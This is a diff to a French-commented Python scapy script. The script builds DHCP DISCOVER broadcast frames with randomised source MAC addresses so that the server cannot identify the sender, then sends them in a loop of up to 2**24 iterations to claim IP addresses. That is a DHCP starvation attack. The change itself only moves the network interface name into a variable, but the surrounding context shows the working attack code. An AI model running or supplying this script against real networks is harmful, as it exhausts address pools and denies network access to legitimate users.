@@ -6,6 +6,9 @@ from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 
+#Variable dont nous avons besoin afin de spécifier l'interface au réseau duquel est envoyé les paquets
+interface = "enxa0cec8f3e4df"
+
 #Construction d'un paquet DHCP_DISCOVER à envoyer
 #Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
 frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
@@ -23,6 +26,6 @@ frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / fra
 #Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP
 
 for i in range (0, 2**24):
-    sendp(frame_discover, iface="enxa0cec8f3e4df",loop=0,verbose=0 )
+    sendp(frame_discover, iface=interface,loop=0,verbose=0)
     time.sleep(0.4)
     print(f"Sending packet - "+str(frame_discover_l2.fields["dst"]))
